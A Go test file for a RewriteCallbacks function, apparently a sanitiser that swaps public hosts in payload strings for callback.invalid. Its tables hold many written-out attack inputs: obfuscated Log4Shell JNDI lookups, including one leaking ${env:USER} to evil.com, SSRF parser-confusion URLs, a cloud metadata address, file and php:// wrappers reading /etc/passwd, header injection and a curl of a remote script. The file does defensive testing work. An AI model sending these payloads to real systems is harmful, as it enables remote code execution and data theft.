package cases

import (
	"net/url"
	"strings"
	"testing"
)

type rewriteTest struct{ name, in, want string }

// public lists inputs that name a public host: it must be replaced, and
// nothing else may change.
var public = []rewriteTest{
	// The cases the task names.
	{"jndi", "${jndi:ldap://evil.com/a}", "${jndi:ldap://callback.invalid/a}"},
	{"upper case and port", "HTTP://Attacker.Example.ORG:8080/x", "HTTP://callback.invalid:8080/x"},
	{"user info", "http://user:pw@evil.com/", "http://user:pw@callback.invalid/"},
	{"protocol relative", "//evil.com/x.js", "//callback.invalid/x.js"},

	// Plain URL forms.
	{"mixed case and trailing dot", "HtTp://EVIL.com./p", "HtTp://callback.invalid/p"},
	{"several trailing dots", "http://evil.com../p", "http://callback.invalid/p"},
	{"single label", "http://evil/a", "http://callback.invalid/a"},
	{"query and fragment", "https://evil.com?x=1#y", "https://callback.invalid?x=1#y"},
	{"two urls", "http://a.com/?u=http://b.org/", "http://callback.invalid/?u=http://callback.invalid/"},
	{"inside text", `go to "https://evil.com", now`, `go to "https://callback.invalid", now`},
	{"in markup", "<script src=//evil.com/x.js></script>", "<script src=//callback.invalid/x.js></script>"},
	{"in query value", "next=//evil.com&x=1", "next=//callback.invalid&x=1"},
	{"jdbc", "jdbc:mysql://evil.com:3306/db", "jdbc:mysql://callback.invalid:3306/db"},
	{"gopher", "gopher://evil.com:70/_x", "gopher://callback.invalid:70/_x"},
	{"nested in php wrapper", "php://filter/resource=http://evil.com/x", "php://filter/resource=http://callback.invalid/x"},
	{"file with remote host", "file://evil.com/share", "file://callback.invalid/share"},
	{"file unc", "file:////evil.com/share", "file:////callback.invalid/share"},
	{"idn", "http://bücher.example/", "http://callback.invalid/"},
	{"punycode", "//xn--bcher-kva.example/", "//callback.invalid/"},
	{"looks local but is not", "http://localhost.evil.com/", "http://callback.invalid/"},
	{"address in a public name", "http://127.0.0.1.nip.io/", "http://callback.invalid/"},
	{"sub localhost is not listed", "http://a.localhost/", "http://callback.invalid/"},
	{"leading dot", "http://.evil.com/", "http://.callback.invalid/"},

	// User info and parser confusion.
	{"local user info, public host", "http://127.0.0.1@evil.com/", "http://127.0.0.1@callback.invalid/"},
	{"public user info, local host", "http://evil.com@127.0.0.1/", "http://callback.invalid@127.0.0.1/"},
	{"two at signs", "http://a@evil.com@127.0.0.1/", "http://a@callback.invalid@127.0.0.1/"},
	{"user info with port", "http://127.0.0.1:80@evil.com:80/", "http://127.0.0.1:80@callback.invalid:80/"},
	{"sub delimiters in user info", "http://a&b;c@evil.com/", "http://a&b;c@callback.invalid/"},
	{"backslash before at", `http://127.0.0.1\@evil.com/`, `http://127.0.0.1\@callback.invalid/`},
	{"encoded slash before at", "http://127.0.0.1%2f@evil.com/", "http://127.0.0.1%2f@callback.invalid/"},
	{"encoded at", "http://127.0.0.1%40evil.com/", "http://127.0.0.1%40callback.invalid/"},

	// A single quote is legal in user info (RFC 3986 sub-delims).
	{"quote in user info", "http://127.0.0.1'@evil.com/", "http://127.0.0.1'@callback.invalid/"},
	{"quote after name in user info", "http://a'@evil.com/", "http://a'@callback.invalid/"},
	{"quote among sub delimiters", "http://a!b'c@evil.com:80/x", "http://a!b'c@callback.invalid:80/x"},
	{"single quoted url", "url='http://evil.com'", "url='http://callback.invalid'"},
	// Browsers also accept these in user info.
	{"space in user info", "http://127.0.0.1 @evil.com/", "http://127.0.0.1 @callback.invalid/"},
	{"words in user info", "http://127.0.0.1 a b@evil.com/", "http://127.0.0.1 a b@callback.invalid/"},
	{"double quote in user info", `http://127.0.0.1"@evil.com/`, `http://127.0.0.1"@callback.invalid/`},
	{"less than in user info", "http://127.0.0.1<@evil.com/", "http://127.0.0.1<@callback.invalid/"},
	{"greater than in user info", "http://127.0.0.1>@evil.com/", "http://127.0.0.1>@callback.invalid/"},
	{"backtick in user info", "http://127.0.0.1`@evil.com/", "http://127.0.0.1`@callback.invalid/"},
	{"user info starting with a quote", `http://"@evil.com/`, `http://"@callback.invalid/`},
	{"user info starting with a space", "http:// @evil.com/", "http:// @callback.invalid/"},
	{"space in relative user info", "//127.0.0.1 @evil.com/", "//127.0.0.1 @callback.invalid/"},
	// The cost of reading past those characters: a public mail domain soon
	// after a URL that has no path is replaced too.
	{"mail after a pathless url", "see http://127.0.0.1 and ask bob@evil.com", "see http://127.0.0.1 and ask bob@callback.invalid"},

	// Slash and backslash variants.
	{"three slashes", "///evil.com/x", "///callback.invalid/x"},
	{"special scheme three slashes", "http:///evil/x", "http:///callback.invalid/x"},
	{"slash backslash", `/\evil.com`, `/\callback.invalid`},
	{"backslashes", `http:\\evil.com\x`, `http:\\callback.invalid\x`},
	{"unc", `\\evil.com\share`, `\\callback.invalid\share`},
	{"no slash", "http:evil.com", "http:callback.invalid"},
	{"one slash", "https:/evil.com/x", "https:/callback.invalid/x"},
	{"json escaped", `{"u":"http:\/\/evil.com\/a"}`, `{"u":"http:\/\/callback.invalid\/a"}`},
	{"json escaped single label", `ldap:\/\/evil\/a`, `ldap:\/\/callback.invalid\/a`},
	{"tab between slashes", "/\t/evil.com", "/\t/callback.invalid"},
	{"encoded tab between slashes", "/%09/evil.com", "/%09/callback.invalid"},
	{"newline between slashes", "http:/\r\n/evil.com/", "http:/\r\n/callback.invalid/"},
	{"tab inside host", "http://ev\til.com/", "http://callback.invalid/"},
	{"newline inside host", "http://ev\nil.com/", "http://callback.invalid/"},
	{"newline before more labels", "http://evil.com\n.attacker.org/", "http://callback.invalid/"},
	{"newline inside last label", "//evil.c\r\nom/", "//callback.invalid/"},
	{"newline after local host", "http://127.0.0.1\n.attacker.org/", "http://callback.invalid/"},
	{"host over three lines", "http://ev\r\nil\r\n.com/", "http://callback.invalid/"},
	{"user info without slashes", "https:user:pw@evil.com/", "https:user:pw@callback.invalid/"},
	{"tab after the scheme", "http:\t//evil/", "http:\t//callback.invalid/"},
	// A replaced host must not then read as the scheme of what follows it.
	{"chained separators", "a0://1://1://1", "a0://callback.invalid://1://1"},
	{"stray brace before scheme", "x}http://evil/", "x}http://callback.invalid/"},
	{"lookup before whole scheme", "${env:X}ldap://evil/", "${env:X}ldap://callback.invalid/"},
	// The raw reading, with the encoded text as user info, still counts.
	{"encoded text before scheme", "%25http://evil.com%2f@a.org", "%25http://callback.invalid%2f@callback.invalid"},
	{"header injection after host", "http://evil.com%0d%0aSet-Cookie:a=b", "http://callback.invalid%0d%0aSet-Cookie:a=b"},

	// Encodings.
	{"percent encoded url", "http%3A%2F%2Fevil.com%2Fx", "http%3A%2F%2Fcallback.invalid%2Fx"},
	{"lower case percent", "url=http%3a%2f%2fevil.com%3a81", "url=http%3a%2f%2fcallback.invalid%3a81"},
	{"double percent", "http%253A%252F%252Fevil.com%252Fx", "http%253A%252F%252Fcallback.invalid%252Fx"},
	{"percent encoded host", "http://%65%76%69%6c.com/", "http://callback.invalid/"},
	{"percent encoded dot", "http://evil%2ecom/", "http://callback.invalid/"},
	{"percent encoded local suffix break", "http://evil.test%2eevil.com/", "http://callback.invalid/"},
	{"nul after host", "http://evil.com%00.local/", "http://callback.invalid%00.local/"},
	{"percent u", "http:%u002f%u002fevil.com/", "http:%u002f%u002fcallback.invalid/"},
	{"unicode escape", `http:\u002f\u002fevil.com/`, `http:\u002f\u002fcallback.invalid/`},
	{"hex escape", `\x68ttp:\x2f\x2fevil.com`, `\x68ttp:\x2f\x2fcallback.invalid`},
	{"numeric entities", "http:&#x2f;&#47;evil.com", "http:&#x2f;&#47;callback.invalid"},
	{"named entities", "http&colon;&sol;&sol;evil&period;com", "http&colon;&sol;&sol;callback.invalid"},
	{"full width host", "http://ｅｖｉｌ.com/", "http://callback.invalid/"},
	{"ideographic dot", "//evil。com/", "//callback.invalid/"},
	{"full width slashes", "／／evil.com", "／／callback.invalid"},
	// URL parsers map these to ASCII letters or drop them.
	{"circled letters", "http://ⓔⓥⓘⓛ.com/", "http://callback.invalid/"},
	{"soft hyphen", "http://\u00adevil.com/", "http://callback.invalid/"},
	{"zero width space", "http://127.0.0.1\u200b.evil.com/", "http://callback.invalid/"},
	{"typographic quotes", "“http://evil.com”", "“http://callback.invalid”"},

	// Addresses.
	{"public ipv4", "http://8.8.8.8/", "http://callback.invalid/"},
	{"public ipv4 trailing dot", "http://8.8.8.8./", "http://callback.invalid/"},
	{"decimal", "http://134744072/", "http://callback.invalid/"},
	{"hex", "http://0x08080808:80/", "http://callback.invalid:80/"},
	{"dotted hex", "http://0x8.0x8.0x8.0x8/", "http://callback.invalid/"},
	{"octal", "http://010.010.010.010/", "http://callback.invalid/"},
	{"short form", "http://8.8.2056/", "http://callback.invalid/"},
	// Octal reading is loopback, decimal reading is public.
	{"ambiguous leading zero", "http://0177.0.0.1/", "http://callback.invalid/"},
	{"ambiguous leading zero private", "http://010.0.0.1/", "http://callback.invalid/"},
	{"shared address space", "http://100.100.100.200/", "http://callback.invalid/"},
	{"relative ipv4", "//8.8.8.8/x", "//callback.invalid/x"},
	{"relative decimal", "//134744072/x", "//callback.invalid/x"},
	{"relative hex", "//0x08080808/x", "//callback.invalid/x"},
	{"ipv6", "http://[2606:4700:4700::1111]:443/", "http://callback.invalid:443/"},
	{"mapped ipv6", "http://[::ffff:8.8.8.8]/", "http://callback.invalid/"},
	{"relative ipv6", "//[2606:4700::1]/x", "//callback.invalid/x"},
	{"bracketed name", "http://[evil.com]/", "http://callback.invalid/"},
	{"text after bracket", "http://[::1]evil.com/", "http://callback.invalid/"},

	// JNDI and lookup obfuscation.
	{"jndi single label", "${jndi:ldap://evil/a}", "${jndi:ldap://callback.invalid/a}"},
	{"jndi upper", "${JNDI:LDAPS://EVIL.COM:636/a}", "${JNDI:LDAPS://callback.invalid:636/a}"},
	{"jndi rmi", "${jndi:rmi://evil.com:1099/a}", "${jndi:rmi://callback.invalid:1099/a}"},
	{"jndi obfuscated scheme", "${${::-j}${::-n}di:${lower:l}${upper:d}ap://evil.com/a}", "${${::-j}${::-n}di:${lower:l}${upper:d}ap://callback.invalid/a}"},
	{"jndi obfuscated single label", "${jndi:${lower:l}dap://evil/a}", "${jndi:${lower:l}dap://callback.invalid/a}"},
	{"jndi obfuscated slashes", "${jndi:ldap:${::-/}${::-/}evil.com/a}", "${jndi:ldap:${::-/}${::-/}callback.invalid/a}"},
	{"jndi obfuscated separator", "${jndi:ldap${::-:}${::-//}evil.com/a}", "${jndi:ldap${::-:}${::-//}callback.invalid/a}"},
	{"jndi url as default value", "${${::-jndi:ldap://evil.com/a}}", "${${::-jndi:ldap://callback.invalid/a}}"},
	{"jndi obfuscated host start", "${jndi:ldap://${::-e}vil.com/a}", "${jndi:ldap://${::-callback.invalid}/a}"},
	{"jndi obfuscated host letters", "${jndi:ldap://${lower:E}${env:X:-v}il.com/a}", "${jndi:ldap://${lower:callback.invalid}${env:X:-}/a}"},
	{"jndi nested obfuscation", "${jndi:ldap://${lower:${upper:evil}}.com/a}", "${jndi:ldap://${lower:${upper:callback.invalid}}/a}"},
	{"jndi date lookup", "${jndi:ldap://${date:'e'}vil.com/a}", "${jndi:ldap://${date:'callback.invalid'}/a}"},
	{"jndi encoded", "%24%7Bjndi%3Aldap%3A%2F%2Fevil.com%2Fa%7D", "%24%7Bjndi%3Aldap%3A%2F%2Fcallback.invalid%2Fa%7D"},
	{"jndi data exfiltration", "${jndi:ldap://${env:USER}.evil.com/a}", "${jndi:ldap://callback.invalid/a}"},
	{"jndi unknown host", "${jndi:ldap://${env:TARGET}/a}", "${jndi:ldap://callback.invalid/a}"},
	{"jndi default marker in path", "${jndi:ldap://evil.com/a:-b}", "${jndi:ldap://callback.invalid/a:-b}"},
	{"jndi hash bypass", "${jndi:ldap://127.0.0.1#.evil.com:1389/a}", "${jndi:ldap://127.0.0.1#.callback.invalid:1389/a}"},
	{"jndi no slashes", "${jndi:dns:evil.com}", "${jndi:dns:callback.invalid}"},
	{"jndi dns name in path", "${jndi:dns:///x.evil.com}", "${jndi:dns:///callback.invalid}"},
	{"jndi dns server and name", "${jndi:dns://8.8.8.8/x.evil.com}", "${jndi:dns://callback.invalid/callback.invalid}"},
	{"jndi dns local server", "${jndi:dns://127.0.0.1/x.evil.com}", "${jndi:dns://127.0.0.1/callback.invalid}"},
	{"jndi corbaloc", "${jndi:corbaloc:iiop:1.2@evil.com:2809/x}", "${jndi:corbaloc:iiop:1.2@callback.invalid:2809/x}"},
	{"corbaname list", "corbaname::a.com:1,:b.org/x", "corbaname::callback.invalid:1,:callback.invalid/x"},
}

// unchanged lists inputs that name no public host.
var unchanged = []string{
	"",
	"a // b comment",
	"http://169.254.169.254/latest",
	"http://127.0.0.1/",
	"http://10.0.0.5/",
	"http://172.16.0.1/",
	"http://192.168.1.1:8080/",
	"http://0.0.0.0:80/",
	"http://0/",
	"http://127.1/",
	"http://127.0.0.1./",
	"http://2130706433/",
	"http://0x7f000001/",
	"http://0x7f.0.0.1/",
	"//127.0.0.1/x",
	"http://[::1]:8080/",
	"http://[::]/",
	"http://[fe80::1%25eth0]/",
	"http://[fd00::1]/",
	"http://[::ffff:127.0.0.1]/",
	"HTTP://LOCALHOST./",
	"http://user@localhost/",
	"http://a.test/",
	"https://B.LOCAL:9/",
	"http://callback.invalid/x",
	"ldap://x.callback.invalid/x",
	"http://127%2e0%2e0%2e1/",
	"http://%6cocalhost/",
	"http%3A%2F%2F127.0.0.1%2F",
	"${jndi:ldap://127.0.0.1:1389/a}",
	"${jndi:ldap://${::-1}27.0.0.1/a}",
	"${jndi:ldap://${env:X:-localhost}/a}",
	"http://127.0.0.1%0d%0aHost:x",
	"http://127.0.0.1\r\nHost: x",
	"http://a.test\r\n--boundary--",
	"file:///etc/passwd",
	"file://etc/passwd",
	"file:///c:/windows/win.ini",
	"file://localhost/etc/passwd",
	"php://filter/convert.base64-encode/resource=index.php",
	"PHP://input",
	"%70hp://filter/resource=x",
	"${env:X}hp://filter/resource=x",
	"data://text/plain;base64,SGk=",
	"phar://a.phar/x.txt",
	"zip://shell.jpg%23payload.php",
	"expect://id",
	"compress.zlib://file.gz",
	"javascript://%0aalert(1)",
	"..//..//etc/passwd",
	"....//....//windows/win.ini",
	"/static//app.min.js",
	"//index.php?x=1",
	`C:\\Windows\\system.ini`,
	`\\?\C:\x`,
	"c://windows/win.ini",
	"//e.g. this",
	"x = total //2",
	"//div[@id='a']",
	"<!--//-->",
	"http: see the notes",
	"ldap:cn=admin,dc=example",
	`{"a":"b\/c"}`,
	"100% sure & done; ${name}",
	// Quotes, spaces and angle brackets around local addresses and prose.
	"url='http://127.0.0.1'",
	"http://127.0.0.1'@localhost/",
	"http://127.0.0.1 @10.0.0.5/",
	"it's on http://localhost, isn't it?",
	"see http://127.0.0.1 for details",
	"open http://localhost and mail admin@localhost",
	"open http://127.0.0.1 then ask @alice",
	`<a href="http://127.0.0.1/">bob@evil.com</a>`,
	"http://127.0.0.1/ and bob@evil.com",
	"http://127.0.0.1? ask bob@evil.com",
	"http://127.0.0.1#top <bob@evil.com>",
	"a // b: ask bob@evil.com",
	"http://127.0.0.1 " + strings.Repeat("x ", 130) + "bob@evil.com",
}

// unrewritten pins the forms the rewrite is known to leave alone. A change
// here is welcome when it rewrites one of them.
var unrewritten = []rewriteTest{
	{name: "bare host", in: "curl evil.com/x.sh"},
	{name: "host header value", in: "evil.com"},
	{name: "mail address", in: "mailto:a@evil.com"},
	{name: "bare address", in: "ping -c1 8.8.8.8"},
	{name: "relative single label", in: "//evil/x"},
	{name: "relative short address", in: "//8.8/x"},
	{name: "relative host named like a file", in: "//evil.html/x"},
	{name: "base64", in: "aHR0cDovL2V2aWwuY29tLw=="},
	{name: "question mark in user info", in: "http://127.0.0.1?@evil.com/"},
	{name: "long user info with a space", in: "http://127.0.0.1 " + strings.Repeat("a", 260) + "@evil.com/"},
	{name: "overlong utf-8 slashes", in: "http:%c0%af%c0%afevil.com"},
	{name: "ipv6 without brackets", in: "http://::ffff:808:808/"},
	{name: "single label without slashes", in: "http:evil"},
	{name: "encoded more than ten times", in: "http:%" + strings.Repeat("25", 10) + "2f%" + strings.Repeat("25", 10) + "2fevil.com"},
}

func TestRewriteCallbacks(t *testing.T) {
	t.Parallel()
	tests := append([]rewriteTest(nil), public...)
	for _, in := range unchanged {
		tests = append(tests, rewriteTest{name: "unchanged " + in, in: in, want: in})
	}
	for _, tt := range unrewritten {
		tests = append(tests, rewriteTest{name: "known gap " + tt.name, in: tt.in, want: tt.in})
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			got := RewriteCallbacks(tt.in)
			if got != tt.want {
				t.Errorf("RewriteCallbacks(%q) = %q, want %q", tt.in, got, tt.want)
			}
			if again := RewriteCallbacks(got); again != got {
				t.Errorf("second rewrite of %q = %q, want no change", got, again)
			}
		})
	}
}

// TestRewriteCallbacksUserInfoAgainstNetURL checks the shapes net/url reads
// as naming a public host: after the rewrite it must read callback.invalid.
func TestRewriteCallbacksUserInfoAgainstNetURL(t *testing.T) {
	t.Parallel()
	hostname := func(t *testing.T, raw string) string {
		t.Helper()
		u, err := url.Parse(raw)
		if err != nil {
			t.Fatalf("url.Parse(%q): %v", raw, err)
		}
		return u.Hostname()
	}
	for _, in := range []string{"http://127.0.0.1'@evil.com/", "http://a'@evil.com/", "http://a!b'c@evil.com:80/x"} {
		if got := hostname(t, in); got != "evil.com" {
			t.Errorf("net/url reads %q as host %q, want evil.com", in, got)
		}
		out := RewriteCallbacks(in)
		if got := hostname(t, out); got != "callback.invalid" {
			t.Errorf("net/url reads the rewrite %q of %q as host %q", out, in, got)
		}
	}
}

// TestRewriteCallbacksHostileInput bounds the work on inputs that would be
// quadratic for a scanner that rereads the rest of the string.
func TestRewriteCallbacksHostileInput(t *testing.T) {
	t.Parallel()
	const n = 1 << 14
	for _, unit := range []string{"${", "//${", `\\a`, "\\\t\\a", "//a@", "//a#", "%25", "${lower:", "http:", "corbaloc:", "//a\n", "//a ", "//a'", "//a<@", "http:a'", "/"} {
		in := strings.Repeat(unit, n)
		got := RewriteCallbacks(in)
		if again := RewriteCallbacks(got); again != got {
			t.Errorf("unit %q: second rewrite changed the result", unit)
		}
	}
}

func FuzzRewriteCallbacks(f *testing.F) {
	for _, tt := range public {
		f.Add(tt.in)
	}
	for _, in := range unchanged {
		f.Add(in)
	}
	f.Fuzz(func(t *testing.T, in string) {
		got := RewriteCallbacks(in)
		if again := RewriteCallbacks(got); again != got {
			t.Errorf("not stable: %q -> %q -> %q", in, got, again)
		}
		// A public URL placed after any text on its own line is rewritten.
		const url, want = "\n http://evil.com/ ", "\n http://callback.invalid/ "
		if out := RewriteCallbacks(in + url); !strings.HasSuffix(out, want) {
			t.Errorf("URL after %q not rewritten: %q", in, out)
		}
	})
}
